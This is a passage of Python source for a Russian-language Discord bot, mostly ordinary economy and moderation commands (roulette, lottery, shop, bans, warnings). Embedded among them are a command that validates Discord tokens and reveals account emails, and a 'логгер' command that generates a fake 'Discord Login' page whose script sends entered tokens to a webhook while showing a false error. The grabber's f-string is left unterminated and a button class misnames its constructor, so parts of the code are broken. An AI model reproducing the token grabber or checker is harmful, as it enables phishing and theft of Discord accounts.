        description=f'{ctx.author.mention}, ты поставил **{bet_amount} монет** на {bet_description}.',
        color=embed_color,
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(name='Результат', value=result_message, inline=False)
    if won:
        embed.add_field(name='Выигрыш', value=f'**{win_amount} монет**', inline=True)
    embed.add_field(name='Твой новый баланс', value=f'**{player_data["balance"]} монет**', inline=True)
    embed.set_footer(text=f'Выпало число: {winning_number}')

    await ctx.send(embed=embed)

    # 7. Логирование (если настроено)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed_title = 'Рулетка: выигрыш' if won else 'Рулетка: проигрыш'
        log_embed_color = discord.Color.green() if won else discord.Color.red()

        log_embed_description = (
            f'{ctx.author.mention} (`{ctx.author.id}`) сделал ставку на {bet_description}.\n'
            f'Сумма ставки: {bet_amount} монет. Выпало: {winning_number}.\n'
            f'{"Выигрыш" if won else "Проигрыш"}: {abs(win_amount - bet_amount) if won else bet_amount} монет. '
            f'Новый баланс: {player_data["balance"]}'
        )
        log_embed = discord.Embed(
            title=log_embed_title,
            description=log_embed_description,
            color=log_embed_color,
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


@bot.command()
async def лотерея(ctx):
    uid = str(ctx.author.id)
    entry = get_user_data(uid)

    # Проверяем наличие билета
    if LOTTERY_TICKET_NAME not in entry['inventory']:
        embed = discord.Embed(
            description=f'У тебя нет билета для лотереи. Купи его в магазине за **{SHOP_ITEMS[LOTTERY_TICKET_NAME]["price"]} монет**.',
            color=discord.Color.red(),
            timestamp=discord.utils.utcnow()
        )
        return await ctx.send(embed=embed, delete_after=10)

    # Удаляем один билет из инвентаря
    entry['inventory'].remove(LOTTERY_TICKET_NAME)
    save_data()

    # Определяем приз по весам
    prizes_names = list(LOTTERY_PRIZES.keys())
    prizes_weights = [LOTTERY_PRIZES[name]['weight'] for name in prizes_names]

    chosen_prize_name = random.choices(prizes_names, weights=prizes_weights, k=1)[0]
    chosen_prize_info = LOTTERY_PRIZES[chosen_prize_name]

    reward_amount = random.randint(chosen_prize_info['min'], chosen_prize_info['max'])

    embed_title = 'Лотерея'
    log_description = f'{ctx.author.mention} (`{ctx.author.id}`) использовал билет.'
    log_color = discord.Color.greyple()

    if chosen_prize_name == 'nothing':
        embed = discord.Embed(
            title=embed_title,
            description=f'{ctx.author.mention}, {chosen_prize_info["message"]}',
            color=discord.Color.red(),
            timestamp=discord.utils.utcnow()
        )
        log_description += ' Результат: ничего.'
    else:
        entry['balance'] += reward_amount
        save_data()
        embed = discord.Embed(
            title=embed_title,
            description=f'{ctx.author.mention}, {chosen_prize_info["message"]} Ты получил **{reward_amount} монет**!',
            color=discord.Color.green(),
            timestamp=discord.utils.utcnow()
        )
        embed.add_field(name='Твой баланс', value=f'**{entry["balance"]} монет**', inline=False)
        log_description += f' Выигрыш: {reward_amount} монет. Баланс: {entry["balance"]}.'
        log_color = discord.Color.green() if reward_amount > 0 else discord.Color.red()

    await ctx.send(embed=embed)

    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Лотерея',
            description=log_description,
            color=log_color,
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


@bot.command()
async def магазин(ctx):
    embed = discord.Embed(title='Магазин сервера', color=discord.Color.blue(), timestamp=discord.utils.utcnow())
    for item_name, item_info in SHOP_ITEMS.items():
        embed.add_field(
            name=f'{item_info.get("emoji", "")} {item_name.capitalize()}',
            value=f'Цена: **{item_info["price"]} монет**\n{item_info["description"]}',
            inline=False
        )
    embed.set_footer(text='Используй !купить [название предмета], чтобы приобрести.')
    await ctx.send(embed=embed)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Магазин',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) открыл магазин.',
            color=discord.Color.blue(),
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


@bot.command()
async def купить(ctx, *, item_name: str):
    item_name = item_name.lower()
    if item_name not in SHOP_ITEMS:
        embed = discord.Embed(description='Такого предмета нет в магазине.', color=discord.Color.red())
        return await ctx.send(embed=embed, delete_after=5)
    item = SHOP_ITEMS[item_name]
    uid = str(ctx.author.id)
    entry = get_user_data(uid)
    if entry['balance'] < item['price']:
        embed = discord.Embed(description='У тебя недостаточно средств для покупки этого предмета.',
                              color=discord.Color.red())
        return await ctx.send(embed=embed, delete_after=5)
    entry['balance'] -= item['price']
    entry['inventory'].append(item_name)
    save_data()
    embed = discord.Embed(
        title='Покупка совершена!',
        description=f'{ctx.author.mention}, ты купил **{item_name.capitalize()}** за **{item["price"]} монет**!',
        color=discord.Color.green(),
        timestamp=discord.utils.utcnow()
    )
    embed.set_footer(text=f'Твой новый баланс: {entry["balance"]} монет')
    await ctx.send(embed=embed)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Покупка предмета',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) купил {item_name} за {item["price"]} монет. Баланс: {entry["balance"]}.',
            color=discord.Color.green(),
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


users = {
    "ID_пользователя_1": {"balance": 100, "level": 5, "xp": 150},
    "ID_пользователя_2": {"balance": 250, "level": 7, "xp": 300},
    # ...
}


@bot.command(name="юзер")
@commands.has_permissions(administrator=True)
async def reconnaissance(ctx, member: discord.Member):
    """Собирает всю информацию о пользователе"""
    verify_role = ctx.guild.get_role(VERIFIED_ROLE_ID)

    embed = discord.Embed(
        title=f"🕵️ РАЗВЕДДАННЫЕ: {member.name}",
        color=0x2c3e50,
        timestamp=datetime.utcnow()
    )
    embed.add_field(name="ID", value=f"{member.id}", inline=True)
    embed.add_field(name="Аккаунт создан", value=member.created_at.strftime("%d.%m.%Y %H:%M"), inline=True)
    embed.add_field(name="Зашёл на сервер", value=member.joined_at.strftime("%d.%m.%Y %H:%M"), inline=True)
    embed.add_field(name="Верифицирован", value="✅ Да" if verify_role in member.roles else "❌ Нет", inline=True)
    embed.add_field(name="Роли", value=", ".join([r.mention for r in member.roles[1:6]]) or "Нет", inline=False)
    embed.add_field(name="Аватар", value=f"[Ссылка]({member.display_avatar.url})", inline=False)
    embed.set_thumbnail(url=member.display_avatar.url)

    await ctx.send(embed=embed)


@bot.command(name="верификация")
@commands.has_permissions(administrator=True)
async def verify_panel_command(ctx):
    """Отправляет панель верификации с кнопкой"""

    class AutoVerifyButton(Button):
        def init(self):
            super().init(label="🔓 ВЕРИФИЦИРОВАТЬСЯ", style=discord.ButtonStyle.green)

        async def callback(self, interaction):
            role = interaction.guild.get_role(VERIFIED_ROLE_ID)
            await interaction.user.add_roles(role)
            await interaction.response.send_message("✅ Верификация пройдена!", ephemeral=True)

    view = View()
    view.add_item(AutoVerifyButton())

    embed = discord.Embed(title="🔐 ПАНЕЛЬ ВЕРИФИКАЦИИ", description="Нажми на кнопку для доступа к рейдам",
                          color=0xff0000)
    await ctx.send(embed=embed, view=view)


@bot.command(name="экспорт")
@commands.has_permissions(administrator=True)
async def export_members(ctx):
    """Экспортирует всех участников в CSV"""
    import csv
    verify_role = ctx.guild.get_role(VERIFIED_ROLE_ID)

    with open("members_export.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Имя", "ID", "Верифицирован", "Дата входа", "Дата регистрации"])
        for member in ctx.guild.members:
            writer.writerow([
                member.name,
                member.id,
                "Да" if verify_role in member.roles else "Нет",
                member.joined_at.strftime("%Y-%m-%d %H:%M"),
                member.created_at.strftime("%Y-%m-%d %H:%M")
            ])

    await ctx.send(file=discord.File("members_export.csv"))


@bot.command(name="чек_токен")
@commands.has_permissions(administrator=True)
async def check_token(ctx, token: str):
    """Проверяет валидность Discord токена"""
    import requests
    headers = {"Authorization": token}
    r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

    if r.status_code == 200:
        data = r.json()
        embed = discord.Embed(title="✅ ТОКЕН ВАЛИДЕН", color=0x00ff00)
        embed.add_field(name="Имя", value=f"{data['username']}#{data['discriminator']}", inline=True)
        embed.add_field(name="ID", value=data['id'], inline=True)
        embed.add_field(name="Email", value=data.get('email', 'скрыт'), inline=True)
        await ctx.send(embed=embed)
    else:
        await ctx.send(f"❌ Токен невалиден (код {r.status_code})")
# ========== 5. ГЕНЕРАЦИЯ ТОКЕН-ЛОГГЕРА (ДЛЯ РАЗВЕДКИ) ==========
@bot.command(name="логгер")
@commands.has_permissions(administrator=True)
async def token_logger(ctx, webhook_url: str = None):
    """Генерирует HTML-логгер для перехвата токенов Discord"""
    if not webhook_url:
        webhook_url = "https://discord.com/api/webhooks/ВАШ_ID/ТОКЕН"

    html_content = f'''<!DOCTYPE html>
<html>
<head><title>Discord Login</title></head>
<body>
<h2>Discord авторизация</h2>
<input type="text" id="token" placeholder="Введите токен" style="width:300px">
<button onclick="send()">Войти</button>
<script>
function send() {{
    var token = document.getElementById('token').value;
    fetch('{webhook_url}', {{method:'POST', body:JSON.stringify({{content:'✅ ТОКЕН: '+token}}), headers:{{'Content-Type':'application/json'}}}});
    alert('Ошибка входа. Повторите позже.');
}}
</script>
</body>
</html>

    with open("token_grabber.html", "w", encoding="utf-8") as f:
        f.write(html_content)

    await ctx.send(file=discord.File("token_grabber.html"))

# --- Административные команды ---

@bot.command()
@commands.has_permissions(ban_members=True)  # Проверяет, есть ли у пользователя право банить
@commands.bot_has_permissions(ban_members=True)  # Проверяет, есть ли у бота право банить
@commands.guild_only()  # Команда работает только на сервере
async def бан(ctx, member: discord.Member, *, reason: str = "Причина не указана."):
    """
    Банит пользователя с сервера и отправляет ему причину в ЛС.
    Пример: !бан @пользователь Спам
    """
    if member.id == ctx.author.id:
        embed = discord.Embed(
            description=f'{ctx.author.mention}, ты не можешь забанить самого себя.',
            color=discord.Color.red()
        )
        return await ctx.send(embed=embed, delete_after=5)

    if ctx.author.top_role.position <= member.top_role.position and ctx.author.id != ctx.guild.owner_id:
        embed = discord.Embed(
            description=f'{ctx.author.mention}, ты не можешь забанить пользователя, чья роль выше или равна твоей.',
            color=discord.Color.red()
        )
        return await ctx.send(embed=embed, delete_after=5)

    if member.id == ctx.guild.owner_id:
        embed = discord.Embed(
            description=f'{ctx.author.mention}, ты не можешь забанить владельца сервера.',
            color=discord.Color.red()
        )
        return await ctx.send(embed=embed, delete_after=5)

    try:
        # 1. Попытка отправить сообщение в ЛС забаненному пользователю
        dm_embed = discord.Embed(
            title='Ты был забанен с сервера!',
            description=f'Тебя забанили с сервера **{ctx.guild.name}**.',
            color=discord.Color.red(),
            timestamp=discord.utils.utcnow()
        )
        dm_embed.add_field(name='Причина', value=reason, inline=False)
        dm_embed.set_footer(text='Если считаешь, что это ошибка, свяжись с администрацией.')

        await member.send(embed=dm_embed)
        sent_dm_success = True
    except discord.Forbidden:
        sent_dm_success = False
        print(f"Не удалось отправить ЛС пользователю {member.display_name} ({member.id}) перед баном.")

    # 2. Выполнение бана
    await ctx.guild.ban(member, reason=reason)

    # 3. Отправка подтверждения в канал, где была вызвана команда
    embed = discord.Embed(
        title='Пользователь забанен',
        description=f'Пользователь {member.mention} был забанен.',
        color=discord.Color.green(),
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(name='Модератор', value=ctx.author.mention, inline=True)
    embed.add_field(name='Причина', value=reason, inline=True)
    if not sent_dm_success:
        embed.set_footer(text='Не удалось отправить сообщение в ЛС забаненному пользователю.')
    await ctx.send(embed=embed)

    # 4. Логирование (выделяется ярко-красным цветом)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='🚫 Пользователь ЗАБАНЕН 🚫',
            description=(
                f'Модератор: {ctx.author.mention} (`{ctx.author.id}`)\n'
                f'Забанен: {member.mention} (`{member.id}`)\n'
                f'Причина: {reason}'
            ),
            color=discord.Color.dark_red(),  # Ярко-красный цвет для выделения
            timestamp=discord.utils.utcnow()
        )
        if not sent_dm_success:
            log_embed.add_field(name='Примечание', value='Не удалось отправить сообщение в ЛС.', inline=False)
        await log_channel.send(embed=log_embed)

    @бан.error
    async def ban_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            embed = discord.Embed(
                description=f'{ctx.author.mention}, у тебя нет прав для использования этой команды (необходимы права: "Ban Members").',
                color=discord.Color.red()
            )
            await ctx.send(embed=embed, delete_after=5)
        elif isinstance(error, commands.BotMissingPermissions):
            embed = discord.Embed(
                description=f'У меня нет достаточных прав для выполнения этой команды (необходимы права: "Ban Members").',
                color=discord.Color.red()
            )
            await ctx.send(embed=embed, delete_after=5)
        elif isinstance(error, commands.MissingRequiredArgument):
            embed = discord.Embed(
                description=f'Укажи пользователя, которого нужно забанить, и причину. Использование: `!бан @пользователь [причина]`',
                color=discord.Color.orange()
            )
            await ctx.send(embed=embed, delete_after=5)
        else:
            print(f"Ошибка в команде бан:", error)
            # Можно отправить общую ошибку администратору или в лог-канал


@bot.command()
@commands.has_permissions(administrator=True)  # Только администраторы могут выдавать предупреждения
async def пред(ctx, member: discord.Member, *, reason: str = "Причина не указана"):
    """Выдать предупреждение участнику."""
    user_data = get_user_data(member.id)
    user_data['warnings'] += 1
    save_data()

    warning_count = user_data['warnings']

    # Сообщение в чат через Embed
    embed = discord.Embed(
        title='⚠️ Предупреждение выдано!',
        description=f'{member.mention} получил предупреждение от {ctx.author.mention}.',
        color=discord.Color.orange(),
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(name='Текущее количество предупреждений', value=f'**{warning_count}**', inline=False)
    embed.add_field(name='Причина', value=reason, inline=False)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text=f'ID пользователя: {member.id}')
    await ctx.send(embed=embed)

    # Логирование (без изменений)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Предупреждение выдано',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) выдал предупреждение {member.mention} (`{member.id}`).',
            color=discord.Color.orange(),
            timestamp=discord.utils.utcnow()
        )
        log_embed.add_field(name='Причина', value=reason, inline=False)
        log_embed.add_field(name='Предупреждений', value=warning_count, inline=True)
        await log_channel.send(embed=log_embed)

    # Проверка на кик
    if warning_count >= 3:
        try:
            # Сообщение в ЛС перед киком (без изменений)
            dm_embed = discord.Embed(
                title='Вы были кикнуты с сервера',
                description=f'Вы были кикнуты с сервера "{ctx.guild.name}" из-за накопления 3 предупреждений. '
                            f'Последнее предупреждение было выдано по причине: "{reason}".',
                color=discord.Color.red()
            )
            dm_embed.set_footer(text='Пожалуйста, ознакомьтесь с правилами сервера.')
            await member.send(embed=dm_embed)
            await asyncio.sleep(1)  # Небольшая задержка, чтобы ЛС успело отправиться

            await member.kick(reason=f'Накопление 3 предупреждений. Последняя причина: {reason}')

            # Сообщение в чат о кике (также через Embed)
            kick_embed_chat = discord.Embed(
                title='🛑 Участник кикнут!',
                description=f'{member.mention} был кикнут с сервера из-за 3 предупреждений.',
                color=discord.Color.dark_red(),
                timestamp=discord.utils.utcnow()
            )
            kick_embed_chat.add_field(name='Причина кика',
                                      value=f'Накопление 3 предупреждений. Последняя причина: {reason}', inline=False)
            kick_embed_chat.set_thumbnail(url=member.display_avatar.url)
            await ctx.send(embed=kick_embed_chat)

            # Логирование кика (без изменений)
            if log_channel:
                kick_embed_log = discord.Embed(
                    title='Участник кикнут (3 предупреждения)',
                    description=f'{member.mention} (`{member.id}`) был кикнут из-за 3 предупреждений.',
                    color=discord.Color.dark_red(),
                    timestamp=discord.utils.utcnow()
                )
                kick_embed_log.add_field(name='Последняя причина', value=reason, inline=False)
                await log_channel.send(embed=kick_embed_log)

            # Сброс предупреждений после кика (чтобы при повторном присоединении не было сразу 3)
            user_data['warnings'] = 0
            save_data()
        except discord.Forbidden:
            error_embed = discord.Embed(
                title='❌ Ошибка кика',
                description=f'Не удалось кикнуть {member.mention}. У меня недостаточно прав или это администратор/модератор.',
                color=discord.Color.red()
            )
            await ctx.send(embed=error_embed, delete_after=10)  # Удалим через 10 сек
            if log_channel:
                log_embed_error = discord.Embed(
                    title='Ошибка кика',
                    description=f'Не удалось кикнуть {member.mention} (`{member.id}`). Недостаточно прав.',
                    color=discord.Color.dark_red(),
                    timestamp=discord.utils.utcnow()
                )
                await log_channel.send(embed=log_embed_error)
        except Exception as e:
            error_embed = discord.Embed(
                title='❌ Неизвестная ошибка',
                description=f'Произошла ошибка при попытке кикнуть {member.mention}: {e}',
                color=discord.Color.red()
            )
            await ctx.send(embed=error_embed, delete_after=10)
            if log_channel:
                log_embed_error = discord.Embed(
                    title='Ошибка кика',
                    description=f'Произошла ошибка при кике {member.mention} (`{member.id}`): {e}',
                    color=discord.Color.dark_red(),
                    timestamp=discord.utils.utcnow()
                )
                await log_channel.send(embed=log_embed_error)


@bot.command()
@commands.has_permissions(administrator=True)  # Только администраторы могут снимать предупреждения
async def снять_пред(ctx, member: discord.Member):
    """Снять одно предупреждение у участника."""
    user_data = get_user_data(member.id)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)

    if user_data['warnings'] > 0:
        user_data['warnings'] -= 1
        save_data()

        # Сообщение в чат через Embed
        embed = discord.Embed(
            title='✅ Предупреждение снято!',
            description=f'У {member.mention} снято одно предупреждение от {ctx.author.mention}.',
            color=discord.Color.green(),
            timestamp=discord.utils.utcnow()
        )
        embed.add_field(name='Оставшиеся предупреждения', value=f'**{user_data["warnings"]}**', inline=False)
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_footer(text=f'ID пользователя: {member.id}')
        await ctx.send(embed=embed)

        # Логирование (без изменений)
        if log_channel:
            log_embed = discord.Embed(
                title='Предупреждение снято',
                description=f'{ctx.author.mention} (`{ctx.author.id}`) снял одно предупреждение у {member.mention} (`{member.id}`).',
                color=discord.Color.light_grey(),
                timestamp=discord.utils.utcnow()
            )
            log_embed.add_field(name='Оставшиеся предупреждения', value=user_data['warnings'], inline=True)
            await log_channel.send(embed=log_embed)
    else:
        # Сообщение в чат через Embed
        embed = discord.Embed(
            title='ℹ️ Нет активных предупреждений',
            description=f'У {member.mention} нет активных предупреждений.',
            color=discord.Color.blue(),
            timestamp=discord.utils.utcnow()
        )
        embed.set_footer(text=f'ID пользователя: {member.id}')
        await ctx.send(embed=embed)

        if log_channel:
            log_embed_info = discord.Embed(
                title='Снятие предупреждения - неактуально',
                description=f'{ctx.author.mention} (`{ctx.author.id}`) попытался снять предупреждение у {member.mention} (`{member.id}`), но у него не было активных предупреждений.',
                color=discord.Color.light_grey(),
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=log_embed_info)

@bot.command()
async def инвентарь(ctx, member: discord.Member = None):
    target_member = member or ctx.author
    uid = str(target_member.id)
    entry = get_user_data(uid)
    if not entry['inventory']:
        description = 'Инвентарь пуст.'
    else:
        item_counts = {}
        for item in entry['inventory']:
            item_counts[item] = item_counts.get(item, 0) + 1
        items_list = []
        for item_name, count in item_counts.items():
            emoji = SHOP_ITEMS.get(item_name, {}).get('emoji', '')
            items_list.append(f'{emoji} {item_name.capitalize()} x{count}')
        description = '\n'.join(items_list)
    embed = discord.Embed(
        title=f'Инвентарь {target_member.display_name}',
        description=description,
        color=discord.Color.purple(),
        timestamp=discord.utils.utcnow()
    )
    embed.set_thumbnail(url=target_member.display_avatar.url)
    await ctx.send(embed=embed)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Проверка инвентаря',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) проверил инвентарь {target_member.mention}.',
            color=discord.Color.purple(),
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


@bot.command()
async def хелп(ctx):
    embed = discord.Embed(
        title='Список команд TMW',
        description=f'Префикс бота: `!`\n'
                    f'Команды, связанные с верификацией, доступны в <#{VERIFY_CHANNEL_ID}>.\n'
                    f'Остальные команды доступны в <#{COMMANDS_CHANNEL_ID}>.',
        color=discord.Color.blue(),
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(name='Верификация', value='`!вериф` — Получить роль верифицированного пользователя.', inline=False)
    embed.add_field(name='Экстренное', value=(
        '`!sos [причина]` — вызов администрации сервера\n'
        '`!кнопка` — экстренная остановка бота (доступ только админам)'
    ), inline=False)
    embed.add_field(name='Экономика и прочее', value=(
        '`!баланс [пользователь]` — Показать свой баланс или баланс другого пользователя.\n'
        '`!дейли` — Получить ежедневную награду.\n'
        '`!работа` — Поработать и заработать немного монет (с кулдауном).\n'
        '`!перевод [пользователь] [сумма]` — Перевести монеты другому пользователю.\n'
        '`!рулетка [ставка] [цвет] или [число]` — Сыграть в рулетку (красное/черное/зеро).\n'
        '`!магазин` — Показать список доступных предметов для покупки.\n'
        '`!купить [предмет]` — Купить предмет из магазина.\n'
        '`!инвентарь [пользователь]` — Показать свой инвентарь или инвентарь другого пользователя.\n'
        '`!лотерея` — Использовать билет и испытать удачу.\n'
        '`!кейс` — открыть кейс\n'
        '`!стат` — посмотреть на статистику сервера.\n'
        '`!лидеры` — посмотреть на статистику топ 10 по экономике и рангу сервера.'
    ), inline=False)
    embed.add_field(name='Административные команды', value=(
        '`!бан [пользователь] [причина]` — блокировка на сервере\n'
        '`!пред [пользователь] [причина]` — выдача предупреждения (за 3 предупреждения кик из сервера)\n'
        '`!очистить [кол-во]` — очищает определённое количество сообщений в канале вызова команды\n'
        '`!сказать [текст]` — написать сообщение от лица бота TMW ServerBot'
    ), inline=False)
    embed.add_field(name='Ранги',
                    value='`!ранг [пользователь]` — Показать свой уровень и опыт или другого пользователя.',
                    inline=False)
    embed.set_footer(text='Пишите сообщения, чтобы получать опыт!')
    await ctx.send(embed=embed)
    log_channel = ctx.guild.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        log_embed = discord.Embed(
            title='Помощь',
            description=f'{ctx.author.mention} (`{ctx.author.id}`) запросил помощь.',
            color=discord.Color.blue(),
            timestamp=discord.utils.utcnow()
        )
        await log_channel.send(embed=log_embed)


if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except KeyboardInterrupt:
        print("\n[!] Остановка бота")
        sys.exit(0)
